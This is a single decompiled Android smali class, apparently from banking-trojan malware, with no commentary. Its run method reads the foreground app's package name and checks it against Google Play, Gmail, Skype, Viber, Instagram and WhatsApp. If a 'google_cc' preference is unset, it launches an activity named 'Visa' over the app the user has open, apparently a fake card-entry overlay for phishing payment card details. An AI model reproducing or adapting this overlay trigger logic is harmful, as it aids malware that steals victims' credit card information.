.class Lcom/up/net/j;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Lcom/up/net/Uoplo;


# direct methods
.method constructor <init>(Lcom/up/net/Uoplo;)V
    .locals 0

    iput-object p1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-ge v0, v1, :cond_2

    iget-object v0, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    invoke-virtual {v1}, Lcom/up/net/Uoplo;->getBaseContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/up/net/Uoplo;->a(Lcom/up/net/Uoplo;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    :goto_0
    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    const-string v2, "com.android.vending"

    invoke-virtual {v1, v2, v0}, Lcom/up/net/Uoplo;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    const-string v2, "com.google.android.gm"

    invoke-virtual {v1, v2, v0}, Lcom/up/net/Uoplo;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_3

    :cond_0
    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    invoke-static {v1}, Lcom/up/net/Uoplo;->a(Lcom/up/net/Uoplo;)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "google_cc"

    const/4 v3, 0x0

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-nez v1, :cond_3

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    const-class v2, Lcom/up/net/Visa;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x20000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    invoke-virtual {v1, v0}, Lcom/up/net/Uoplo;->startActivity(Landroid/content/Intent;)V

    :cond_1
    :goto_1
    return-void

    :cond_2
    iget-object v0, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    invoke-virtual {v1}, Lcom/up/net/Uoplo;->getBaseContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/up/net/Uoplo;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_3
    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    const-string v2, "com.skype.raider"

    invoke-virtual {v1, v2, v0}, Lcom/up/net/Uoplo;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    const-string v2, "com.viber.voip"

    invoke-virtual {v1, v2, v0}, Lcom/up/net/Uoplo;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    const-string v2, "com.instagram.android"

    invoke-virtual {v1, v2, v0}, Lcom/up/net/Uoplo;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    const-string v2, "com.whatsapp"

    invoke-virtual {v1, v2, v0}, Lcom/up/net/Uoplo;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_4
    iget-object v0, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    invoke-static {v0}, Lcom/up/net/Uoplo;->a(Lcom/up/net/Uoplo;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "google_cc"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_1

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    const-class v2, Lcom/up/net/Visa;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x20000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lcom/up/net/j;->a:Lcom/up/net/Uoplo;

    invoke-virtual {v1, v0}, Lcom/up/net/Uoplo;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_1
.end method
